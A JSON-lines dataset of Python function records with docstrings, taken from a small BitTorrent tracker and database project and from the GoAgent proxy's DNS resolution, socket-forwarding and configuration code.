{"docstring": "\"\"\" Return the value given by key, and remove it. \"\"\"\n\n", "func_signal": "def pop(self, key):\n", "code": "key = dumps(key)\nvalue = self.data[key]\ndel self.data[key]\nreturn loads(value)", "path": "simpledb.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Given a string and a number n, cuts the string up, returns a\nlist of strings, all size n. \"\"\"\n\n", "func_signal": "def slice(string, n):\n", "code": "temp = []\ni = n\nwhile i <= len(string):\n\ttemp.append(string[(i-n):i])\n\ti += n\n\ntry:\t# Add on any stragglers\n\tif string[(i-n)] != \"\":\n\t\ttemp.append(string[(i-n):])\nexcept IndexError:\n\tpass\n\nreturn temp", "path": "util.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that multiple peers works correctly. \"\"\"\n\n", "func_signal": "def test_multiple_peers(self):\n", "code": "self.n = tracker.make_peer_list \\\n\t([(\"test1\", \"100.100.100.100\", \"1000\"), \\\n\t\t(\"test2\", \"100.100.100.100\", \"1000\")])\nself.assertEqual(self.n, [{'ip': '100.100.100.100', \\\n\t'peer id': 'test1', 'port': 1000}, \\\n\t\t{'ip': '100.100.100.100', \\\n\t\t\t'peer id': 'test2', 'port': 1000}])", "path": "tests\\tracker_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that an empty peer list works. \"\"\"\n\n", "func_signal": "def test_empty_peer(self):\n", "code": "self.n = tracker.make_compact_peer_list([])\nself.assertEqual(self.n, \"\")", "path": "tests\\tracker_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Return the value held by the key. \"\"\"\n\n", "func_signal": "def __getitem__(self, key):\n", "code": "key = dumps(key)\nvalue = self.data[key]\nreturn loads(value)", "path": "simpledb.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Return the value held by key, or default if it isn't in\nthe database. \"\"\"\n\n", "func_signal": "def setdefault(self, key, default):\n", "code": "key = dumps(key)\ntry:\n\tvalue = self.data[key]\nexcept KeyError:\n\treturn default\nreturn loads(value)", "path": "simpledb.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that a duplicated peer is not added. \"\"\"\n\n", "func_signal": "def test_duplicate_peer(self):\n", "code": "self.db = {'test_hash': [('test', '100.100.100.100', 1000)]}\ntracker.add_peer(self.db, \\\n\t\"test_hash\", \"test\", \"100.100.100.100\", 1000)\nself.assertEqual(self.db, \\\n\t{'test_hash': [('test', '100.100.100.100', 1000)]})", "path": "tests\\tracker_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Return a list of tuples of the keys and values. \"\"\"\n\n", "func_signal": "def items(self):\n", "code": "keys = self.data.keys()\nitems = [(loads(key), loads(self.data[key])) for key in keys]\nreturn items", "path": "simpledb.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Return true if the database contains the key. \"\"\"\n\n", "func_signal": "def __contains__(self, key):\n", "code": "key = dumps(key)\nboolean = self.data.has_key(key)\t# Returns 1 or 0.\nreturn bool(boolean)", "path": "simpledb.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that a larger string slice works correctly. \"\"\"\n\n", "func_signal": "def test_longer(self):\n", "code": "self.n = util.slice(\"abcdef\", 2)\nself.assertEqual(self.n, [\"ab\", \"cd\", \"ef\"])", "path": "tests\\util_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Start the tracker. \"\"\"\n\n", "func_signal": "def setUp(self):\n", "code": "self.port = 8888\nself.inmemory = True\nself.interval =10\n\nself.tracker = tracker.Tracker(port = self.port, \\\n\tinmemory = self.inmemory, \\\n\tinterval = self.interval)", "path": "tests\\tracker_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that multiple peers works correctly. \"\"\"\n\n", "func_signal": "def test_multiple_peers(self):\n", "code": "self.n = tracker.make_compact_peer_list \\\n\t([(\"test1\", \"100.100.100.100\", \"1000\"), \\\n\t\t(\"test2\", \"100.100.100.100\", \"1000\")])\nself.assertEqual(self.n, \"dddd\\x03\\xe8dddd\\x03\\xe8\")", "path": "tests\\tracker_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that a unique peer is added correctly. \"\"\"\n\n", "func_signal": "def test_unique_peer(self):\n", "code": "self.db = {}\ntracker.add_peer(self.db, \\\n\t\"test_hash\", \"test\", \"100.100.100.100\", 1000)\nself.assertEqual(self.db, \\\n\t{'test_hash': [('test', '100.100.100.100', 1000)]})", "path": "tests\\tracker_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that if the request has a slash to start, that it is\nremoved as well. \"\"\"\n\n", "func_signal": "def test_slash_at_start(self):\n", "code": "self.n = tracker.decode_request(\"/?key=value\")\nself.assertEqual(self.n, {\"key\":[\"value\"]})", "path": "tests\\tracker_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that a small string slices correctly. \"\"\"\n\n", "func_signal": "def test_simple(self):\n", "code": "self.n = util.slice(\"abc\", 1)\nself.assertEqual(self.n, [\"a\", \"b\", \"c\"])", "path": "tests\\util_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that a string too long works fine. \"\"\"\n\n", "func_signal": "def test_too_long(self):\n", "code": "self.n = util.slice(\"abcd\", 6)\nself.assertEqual(self.n, [\"abcd\"])", "path": "tests\\util_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Return a list of values. \"\"\"\n\n", "func_signal": "def values(self):\n", "code": "values = [loads(value) for value in self.data.values()]\nreturn values", "path": "simpledb.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that a simple request is decoded correctly. \"\"\"\n\n", "func_signal": "def test_simple_request(self):\n", "code": "self.n = tracker.decode_request(\"?key=value\")\nself.assertEqual(self.n, {\"key\":[\"value\"]})", "path": "tests\\tracker_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\" Test that characters are correctly concatenated. \"\"\"\n\n", "func_signal": "def test_concatenation(self):\n", "code": "self.n = util.collapse([\"t\", \"e\", \"s\", \"t\"])\nself.assertEqual(self.n, \"test\")", "path": "tests\\util_tests.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
{"docstring": "\"\"\"Constructor.  May be extended, do not override.\"\"\"\n", "func_signal": "def __init__(self, listener, RequestHandlerClass, bind_and_activate=True):\n", "code": "if hasattr(listener, 'getsockname'):\n    SocketServer.BaseServer.__init__(self, listener.getsockname(), RequestHandlerClass)\n    self.socket = listener\nelse:\n    SocketServer.ThreadingTCPServer.__init__(self, listener, RequestHandlerClass, bind_and_activate)", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "# https://support.google.com/websearch/answer/186669?hl=zh-Hans\n", "func_signal": "def resolve_iplist(self):\n", "code": "def do_local_resolve(host, queue):\n    assert isinstance(host, basestring)\n    for _ in xrange(3):\n        try:\n            family = socket.AF_INET6 if self.GAE_IPV6 else socket.AF_INET\n            iplist = [x[-1][0] for x in socket.getaddrinfo(host, 80, family)]\n            queue.put((host, iplist))\n        except (socket.error, OSError) as e:\n            logging.warning('socket.getaddrinfo host=%r failed: %s', host, e)\n            time.sleep(0.1)\ngoogle_blacklist = ['216.239.32.20'] + list(self.DNS_BLACKLIST)\ngoogle_blacklist_prefix = tuple(x for x in self.DNS_BLACKLIST if x.endswith('.'))\nfor name, need_resolve_hosts in list(self.IPLIST_ALIAS.items()):\n    if all(re.match(r'\\d+\\.\\d+\\.\\d+\\.\\d+', x) or ':' in x for x in need_resolve_hosts):\n        continue\n    need_resolve_remote = [x for x in need_resolve_hosts if ':' not in x and not re.match(r'\\d+\\.\\d+\\.\\d+\\.\\d+', x)]\n    resolved_iplist = [x for x in need_resolve_hosts if x not in need_resolve_remote]\n    result_queue = Queue.Queue()\n    for host in need_resolve_remote:\n        logging.debug('local resolve host=%r', host)\n        thread.start_new_thread(do_local_resolve, (host, result_queue))\n    for _ in xrange(len(need_resolve_remote)):\n        try:\n            host, iplist = result_queue.get(timeout=8)\n            resolved_iplist += iplist\n        except Queue.Empty:\n            break\n    if name.startswith('google_') and name not in ('google_cn', 'google_hk') and resolved_iplist:\n        iplist_prefix = re.split(r'[\\.:]', resolved_iplist[0])[0]\n        resolved_iplist = list(set(x for x in resolved_iplist if x.startswith(iplist_prefix)))\n    else:\n        resolved_iplist = list(set(resolved_iplist))\n    if name.startswith('google_'):\n        resolved_iplist = list(set(resolved_iplist) - set(google_blacklist))\n        resolved_iplist = [x for x in resolved_iplist if not x.startswith(google_blacklist_prefix)]\n    if len(resolved_iplist) == 0 and name in ('google_hk', 'google_cn') and not self.GAE_IPV6:\n        logging.error('resolve %s host return empty! please retry!', name)\n        sys.exit(-1)\n    logging.info('resolve name=%s host to iplist=%r', name, resolved_iplist)\n    common.IPLIST_ALIAS[name] = resolved_iplist\nif self.IPLIST_ALIAS.get('google_cn', []):\n    try:\n        for _ in xrange(4):\n            socket.create_connection((random.choice(self.IPLIST_ALIAS['google_cn']), 80), timeout=2).close()\n    except socket.error:\n        self.IPLIST_ALIAS['google_cn'] = []\nif len(self.IPLIST_ALIAS.get('google_cn', [])) < 4 and self.IPLIST_ALIAS.get('google_hk', []):\n    logging.warning('google_cn resolved too short iplist=%s, switch to google_hk', self.IPLIST_ALIAS.get('google_cn', []))\n    self.IPLIST_ALIAS['google_cn'] = self.IPLIST_ALIAS['google_hk']", "path": "goagent_out_of_box_yang\\proxy.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"mock response\"\"\"\n", "func_signal": "def handle(self, handler, status=400, headers={}, body=''):\n", "code": "logging.info('%s \"MOCK %s %s %s\" %d %d', handler.address_string(), handler.command, handler.path, handler.protocol_version, status, len(body))\nheaders = dict((k.title(), v) for k, v in headers.items())\nif isinstance(body, unicode):\n    body = body.encode('utf8')\nif 'Transfer-Encoding' in headers:\n    del headers['Transfer-Encoding']\nif 'Content-Length' not in headers:\n    headers['Content-Length'] = len(body)\nif 'Connection' not in headers:\n    headers['Connection'] = 'close'\nhandler.send_response(status)\nfor key, value in headers.items():\n    handler.send_header(key, value)\nhandler.end_headers()\nhandler.wfile.write(body)", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"dns query over tcp\"\"\"\n", "func_signal": "def dnslib_resolve_over_tcp(query, dnsservers, timeout, **kwargs):\n", "code": "if not isinstance(query, (basestring, dnslib.DNSRecord)):\n    raise TypeError('query argument requires string/DNSRecord')\nblacklist = kwargs.get('blacklist', ())\ndef do_resolve(query, dnsserver, timeout, queobj):\n    if isinstance(query, basestring):\n        qtype = dnslib.QTYPE.AAAA if ':' in dnsserver else dnslib.QTYPE.A\n        query = dnslib.DNSRecord(q=dnslib.DNSQuestion(query, qtype=qtype))\n    query_data = query.pack()\n    sock_family = socket.AF_INET6 if ':' in dnsserver else socket.AF_INET\n    sock = socket.socket(sock_family)\n    rfile = None\n    try:\n        sock.settimeout(timeout or None)\n        sock.connect(parse_hostport(dnsserver, 53))\n        sock.send(struct.pack('>h', len(query_data)) + query_data)\n        rfile = sock.makefile('r', 1024)\n        reply_data_length = rfile.read(2)\n        if len(reply_data_length) < 2:\n            raise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsserver))\n        reply_data = rfile.read(struct.unpack('>h', reply_data_length)[0])\n        record = dnslib.DNSRecord.parse(reply_data)\n        iplist = [str(x.rdata) for x in record.rr if x.rtype in (1, 28, 255)]\n        if any(x in blacklist for x in iplist):\n            logging.debug('query=%r dnsserver=%r record bad iplist=%r', query, dnsserver, iplist)\n            raise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsserver))\n        else:\n            logging.debug('query=%r dnsserver=%r record iplist=%s', query, dnsserver, iplist)\n            queobj.put(record)\n    except socket.error as e:\n        logging.debug('query=%r dnsserver=%r failed %r', query, dnsserver, e)\n        queobj.put(e)\n    finally:\n        if rfile:\n            rfile.close()\n        sock.close()\nqueobj = Queue.Queue()\nfor dnsserver in dnsservers:\n    thread.start_new_thread(do_resolve, (query, dnsserver, timeout, queobj))\nfor i in range(len(dnsservers)):\n    try:\n        result = queobj.get(timeout)\n    except Queue.Empty:\n        raise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsservers))\n    if result and not isinstance(result, Exception):\n        return result\n    elif i == len(dnsservers) - 1:\n        logging.warning('dnslib_resolve_over_tcp %r with %s return %r', query, dnsservers, result)\nraise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsservers))", "path": "goagent_out_of_box_yang\\dnsproxy.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"http://dev.maxmind.com/geoip/legacy/codes/iso3166/\"\"\"\n", "func_signal": "def get_country_code(self, hostname, dnsservers):\n", "code": "try:\n    return self.region_cache[hostname]\nexcept KeyError:\n    pass\ntry:\n    if re.match(r'^\\d+\\.\\d+\\.\\d+\\.\\d+$', hostname) or ':' in hostname:\n        iplist = [hostname]\n    elif dnsservers:\n        iplist = dnslib_record2iplist(dnslib_resolve_over_udp(hostname, dnsservers, timeout=2))\n    else:\n        iplist = socket.gethostbyname_ex(hostname)[-1]\n    if iplist[0].startswith(('127.', '192.168.', '10.')):\n        country_code = 'LOCAL'\n    else:\n        country_code = self.geoip.country_code_by_addr(iplist[0])\nexcept StandardError as e:\n    logging.warning('DirectRegionFilter cannot determine region for hostname=%r %r', hostname, e)\n    country_code = ''\nself.region_cache[hostname] = country_code\nreturn country_code", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"https://developers.google.com/appengine/docs/python/urlfetch/\"\"\"\n", "func_signal": "def filter(self, handler):\n", "code": "if handler.command == 'CONNECT':\n    do_ssl_handshake = 440 <= handler.port <= 450 or 1024 <= handler.port <= 65535\n    alias = handler.net2.getaliasbyname(handler.path)\n    if alias:\n        return 'direct', {'cache_key': '%s:%d' % (alias, handler.port), 'headfirst': '.google' in handler.host}\n    else:\n        return 'strip', {'do_ssl_handshake': do_ssl_handshake}\nelif handler.command in ('GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'PATCH'):\n    alias = handler.net2.getaliasbyname(handler.path)\n    if alias:\n        return 'direct', {'cache_key': '%s:%d' % (alias, handler.port), 'headfirst': '.google' in handler.host}\n    else:\n        return 'gae', {}\nelse:\n    if 'php' in handler.handler_plugins:\n        return 'php', {}\n    else:\n        logging.warning('\"%s %s\" not supported by GAE, please enable PHP mode!', handler.command, handler.path)\n        return 'direct', {}", "path": "goagent_out_of_box_yang\\proxy.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"forward socket\"\"\"\n", "func_signal": "def handle_connect(self, handler, kwargs):\n", "code": "host = handler.host\nport = handler.port\nlocal = handler.connection\nremote = None\nhandler.connection.send('HTTP/1.1 200 OK\\r\\n\\r\\n')\nhandler.close_connection = 1\nfor i in xrange(self.max_retry):\n    try:\n        remote = handler.net2.create_tcp_connection(host, port, handler.net2.connect_timeout, **kwargs)\n    except StandardError as e:\n        logging.exception('%s \"FORWARD %s %s:%d %s\" %r', handler.address_string(), handler.command, host, port, handler.protocol_version, e)\n        if hasattr(remote, 'close'):\n            remote.close()\n        if i == self.max_retry - 1:\n            raise\nlogging.info('%s \"FORWARD %s %s:%d %s\" - -', handler.address_string(), handler.command, host, port, handler.protocol_version)\nif hasattr(remote, 'fileno'):\n    # reset timeout default to avoid long http upload failure, but it will delay timeout retry :(\n    remote.settimeout(None)\nforward_socket(local, remote, 60, bufsize=256*1024)", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"load config from proxy.ini\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "ConfigParser.RawConfigParser.OPTCRE = re.compile(r'(?P<option>\\S+)\\s+(?P<vi>[=])\\s+(?P<value>.*)$')\nself.CONFIG = ConfigParser.ConfigParser()\nself.CONFIG_FILENAME = os.path.splitext(os.path.abspath(__file__))[0]+'.ini'\nself.CONFIG_USER_FILENAME = re.sub(r'\\.ini$', '.user.ini', self.CONFIG_FILENAME)\nself.CONFIG.read([self.CONFIG_FILENAME, self.CONFIG_USER_FILENAME])\n\nfor key, value in os.environ.items():\n    m = re.match(r'^%s([A-Z]+)_([A-Z\\_\\-]+)$' % self.ENV_CONFIG_PREFIX, key)\n    if m:\n        self.CONFIG.set(m.group(1).lower(), m.group(2).lower(), value)\n\nself.LISTEN_IP = self.CONFIG.get('listen', 'ip')\nself.LISTEN_PORT = self.CONFIG.getint('listen', 'port')\nself.LISTEN_USERNAME = self.CONFIG.get('listen', 'username') if self.CONFIG.has_option('listen', 'username') else ''\nself.LISTEN_PASSWORD = self.CONFIG.get('listen', 'password') if self.CONFIG.has_option('listen', 'password') else ''\nself.LISTEN_VISIBLE = self.CONFIG.getint('listen', 'visible')\nself.LISTEN_DEBUGINFO = self.CONFIG.getint('listen', 'debuginfo')\n\nself.GAE_ENABLE = self.CONFIG.getint('gae', 'enable')\nself.GAE_APPIDS = re.findall(r'[\\w\\-\\.]+', self.CONFIG.get('gae', 'appid').replace('.appspot.com', ''))\nself.GAE_PASSWORD = self.CONFIG.get('gae', 'password').strip()\nself.GAE_PATH = self.CONFIG.get('gae', 'path')\nself.GAE_MODE = self.CONFIG.get('gae', 'mode')\nself.GAE_IPV6 = self.CONFIG.getint('gae', 'ipv6')\nself.GAE_WINDOW = self.CONFIG.getint('gae', 'window')\nself.GAE_KEEPALIVE = self.CONFIG.getint('gae', 'keepalive')\nself.GAE_CACHESOCK = self.CONFIG.getint('gae', 'cachesock')\nself.GAE_HEADFIRST = self.CONFIG.getint('gae', 'headfirst')\nself.GAE_OBFUSCATE = self.CONFIG.getint('gae', 'obfuscate')\nself.GAE_VALIDATE = self.CONFIG.getint('gae', 'validate')\nself.GAE_TRANSPORT = self.CONFIG.getint('gae', 'transport') if self.CONFIG.has_option('gae', 'transport') else 0\nself.GAE_OPTIONS = self.CONFIG.get('gae', 'options')\nself.GAE_REGIONS = set(x.upper() for x in self.CONFIG.get('gae', 'regions').split('|') if x.strip())\nself.GAE_SSLVERSION = self.CONFIG.get('gae', 'sslversion')\nself.GAE_PAGESPEED = self.CONFIG.getint('gae', 'pagespeed') if self.CONFIG.has_option('gae', 'pagespeed') else 0\n\nif self.GAE_IPV6:\n    sock = None\n    try:\n        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)\n        sock.connect(('2001:4860:4860::8888', 53))\n        logging.info('use ipv6 interface %s for gae', sock.getsockname()[0])\n    except Exception as e:\n        logging.info('Fail try use ipv6 %r, fallback ipv4', e)\n        self.GAE_IPV6 = 0\n    finally:\n        if sock:\n            sock.close()\n\nif 'USERDNSDOMAIN' in os.environ and re.match(r'^\\w+\\.\\w+$', os.environ['USERDNSDOMAIN']):\n    self.CONFIG.set('profile', '.' + os.environ['USERDNSDOMAIN'], 'direct')\n\nwithgae_sites = []\nwithphp_sites = []\ncrlf_sites = []\nnocrlf_sites = []\nforcehttps_sites = []\nnoforcehttps_sites = []\nfakehttps_sites = []\nnofakehttps_sites = []\ndns_servers = []\nurlrewrite_map = collections.OrderedDict()\nrule_map = collections.OrderedDict()\n\nfor pattern, rule in self.CONFIG.items('profile'):\n    rules = [x.strip() for x in re.split(r'[,\\|]', rule) if x.strip()]\n    if rule.startswith(('file://', 'http://', 'https://')) or '$1' in rule:\n        urlrewrite_map[pattern] = rule\n        continue\n    for rule, sites in [('withgae', withgae_sites),\n                        ('withphp', withphp_sites),\n                        ('crlf', crlf_sites),\n                        ('nocrlf', nocrlf_sites),\n                        ('forcehttps', forcehttps_sites),\n                        ('noforcehttps', noforcehttps_sites),\n                        ('fakehttps', fakehttps_sites),\n                        ('nofakehttps', nofakehttps_sites)]:\n        if rule in rules:\n            sites.append(pattern)\n            rules.remove(rule)\n    if rules:\n        rule_map[pattern] = rules[0]\n\nself.HTTP_DNS = dns_servers\nself.WITHGAE_SITES = tuple(withgae_sites)\nself.WITHPHP_SITES = tuple(withphp_sites)\nself.CRLF_SITES = tuple(crlf_sites)\nself.NOCRLF_SITES = set(nocrlf_sites)\nself.FORCEHTTPS_SITES = tuple(forcehttps_sites)\nself.NOFORCEHTTPS_SITES = set(noforcehttps_sites)\nself.FAKEHTTPS_SITES = tuple(fakehttps_sites)\nself.NOFAKEHTTPS_SITES = set(nofakehttps_sites)\nself.URLREWRITE_MAP = urlrewrite_map\nself.RULE_MAP = rule_map\n\nself.IPLIST_ALIAS = collections.OrderedDict((k, v.split('|') if v else []) for k, v in self.CONFIG.items('iplist'))\nself.IPLIST_PREDEFINED = [x for x in sum(self.IPLIST_ALIAS.values(), []) if re.match(r'^\\d+\\.\\d+\\.\\d+\\.\\d+$', x) or ':' in x]\n\nif self.GAE_IPV6 and 'google_ipv6' in self.IPLIST_ALIAS:\n    for name in self.IPLIST_ALIAS.keys():\n        if name.startswith('google') and name not in ('google_ipv6', 'google_talk'):\n            self.IPLIST_ALIAS[name] = self.IPLIST_ALIAS['google_ipv6']\n\nself.PAC_ENABLE = self.CONFIG.getint('pac', 'enable')\nself.PAC_IP = self.CONFIG.get('pac', 'ip')\nself.PAC_PORT = self.CONFIG.getint('pac', 'port')\nself.PAC_FILE = self.CONFIG.get('pac', 'file').lstrip('/')\nself.PAC_GFWLIST = self.CONFIG.get('pac', 'gfwlist')\nself.PAC_ADBLOCK = self.CONFIG.get('pac', 'adblock')\nself.PAC_ADMODE = self.CONFIG.getint('pac', 'admode')\nself.PAC_EXPIRED = self.CONFIG.getint('pac', 'expired')\n\nself.PHP_ENABLE = self.CONFIG.getint('php', 'enable')\nself.PHP_LISTEN = self.CONFIG.get('php', 'listen')\nself.PHP_PASSWORD = self.CONFIG.get('php', 'password') if self.CONFIG.has_option('php', 'password') else ''\nself.PHP_CRLF = self.CONFIG.getint('php', 'crlf') if self.CONFIG.has_option('php', 'crlf') else 1\nself.PHP_VALIDATE = self.CONFIG.getint('php', 'validate') if self.CONFIG.has_option('php', 'validate') else 0\nself.PHP_KEEPALIVE = self.CONFIG.getint('php', 'keepalive')\nself.PHP_FETCHSERVER = self.CONFIG.get('php', 'fetchserver')\nself.PHP_HOSTS = self.CONFIG.get('php', 'hosts').split('|') if self.CONFIG.get('php', 'hosts') else []\n\nself.VPS_ENABLE = self.CONFIG.getint('vps', 'enable')\nself.VPS_LISTEN = self.CONFIG.get('vps', 'listen')\nself.VPS_FETCHSERVER = self.CONFIG.get('vps', 'fetchserver')\n\nself.PROXY_ENABLE = self.CONFIG.getint('proxy', 'enable')\nself.PROXY_AUTODETECT = self.CONFIG.getint('proxy', 'autodetect') if self.CONFIG.has_option('proxy', 'autodetect') else 0\nself.PROXY_HOST = self.CONFIG.get('proxy', 'host')\nself.PROXY_PORT = self.CONFIG.getint('proxy', 'port')\nself.PROXY_USERNAME = self.CONFIG.get('proxy', 'username')\nself.PROXY_PASSWROD = self.CONFIG.get('proxy', 'password')\n\nif not self.PROXY_ENABLE and self.PROXY_AUTODETECT:\n    system_proxy = ProxyUtil.get_system_proxy()\n    if system_proxy and self.LISTEN_IP not in system_proxy:\n        _, username, password, address = ProxyUtil.parse_proxy(system_proxy)\n        proxyhost, _, proxyport = address.rpartition(':')\n        self.PROXY_ENABLE = 1\n        self.PROXY_USERNAME = username\n        self.PROXY_PASSWROD = password\n        self.PROXY_HOST = proxyhost\n        self.PROXY_PORT = int(proxyport)\nif self.PROXY_ENABLE:\n    self.GAE_MODE = 'https'\n\nself.AUTORANGE_HOSTS = self.CONFIG.get('autorange', 'hosts').split('|')\nself.AUTORANGE_ENDSWITH = tuple(self.CONFIG.get('autorange', 'endswith').split('|'))\nself.AUTORANGE_NOENDSWITH = tuple(self.CONFIG.get('autorange', 'noendswith').split('|'))\nself.AUTORANGE_MAXSIZE = self.CONFIG.getint('autorange', 'maxsize')\nself.AUTORANGE_WAITSIZE = self.CONFIG.getint('autorange', 'waitsize')\nself.AUTORANGE_BUFSIZE = self.CONFIG.getint('autorange', 'bufsize')\nself.AUTORANGE_THREADS = self.CONFIG.getint('autorange', 'threads')\n\nself.FETCHMAX_LOCAL = self.CONFIG.getint('fetchmax', 'local') if self.CONFIG.get('fetchmax', 'local') else 3\nself.FETCHMAX_SERVER = self.CONFIG.get('fetchmax', 'server')\n\nself.DNS_ENABLE = self.CONFIG.getint('dns', 'enable')\nself.DNS_LISTEN = self.CONFIG.get('dns', 'listen')\nself.DNS_SERVERS = self.HTTP_DNS or self.CONFIG.get('dns', 'servers').split('|')\nself.DNS_BLACKLIST = set(self.CONFIG.get('dns', 'blacklist').split('|'))\nself.DNS_TCPOVER = tuple(self.CONFIG.get('dns', 'tcpover').split('|')) if self.CONFIG.get('dns', 'tcpover').strip() else tuple()\nif self.GAE_IPV6:\n    self.DNS_SERVERS = [x for x in self.DNS_SERVERS if ':' in x]\nelse:\n    self.DNS_SERVERS = [x for x in self.DNS_SERVERS if ':' not in x]\n\nself.USERAGENT_ENABLE = self.CONFIG.getint('useragent', 'enable')\nself.USERAGENT_STRING = self.CONFIG.get('useragent', 'string')\n\nself.LOVE_ENABLE = self.CONFIG.getint('love', 'enable')\nself.LOVE_TIP = self.CONFIG.get('love', 'tip').encode('utf8').decode('unicode-escape').split('|')", "path": "goagent_out_of_box_yang\\proxy.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"forward socket\"\"\"\n", "func_signal": "def forward_socket(local, remote, timeout, bufsize):\n", "code": "try:\n    tick = 1\n    timecount = timeout\n    while 1:\n        timecount -= tick\n        if timecount <= 0:\n            break\n        (ins, _, errors) = select.select([local, remote], [], [local, remote], tick)\n        if errors:\n            break\n        for sock in ins:\n            data = sock.recv(bufsize)\n            if not data:\n                break\n            if sock is remote:\n                local.sendall(data)\n                timecount = timeout\n            else:\n                remote.sendall(data)\n                timecount = timeout\nexcept socket.timeout:\n    pass\nexcept (socket.error, ssl.SSLError, OpenSSL.SSL.Error) as e:\n    if e.args[0] not in (errno.ECONNABORTED, errno.ECONNRESET, errno.ENOTCONN, errno.EPIPE):\n        raise\n    if e.args[0] in (errno.EBADF,):\n        return\nfinally:\n    for sock in (remote, local):\n        try:\n            sock.close()\n        except StandardError:\n            pass", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"make ThreadingTCPServer happy\"\"\"\n", "func_signal": "def handle_error(self, *args):\n", "code": "exc_info = sys.exc_info()\nerror = exc_info and len(exc_info) and exc_info[1]\nif isinstance(error, (socket.error, ssl.SSLError, OpenSSL.SSL.Error)) and len(error.args) > 1 and 'bad write retry' in error.args[1]:\n    exc_info = error = None\nelse:\n    del exc_info, error\n    SocketServer.ThreadingTCPServer.handle_error(self, *args)", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
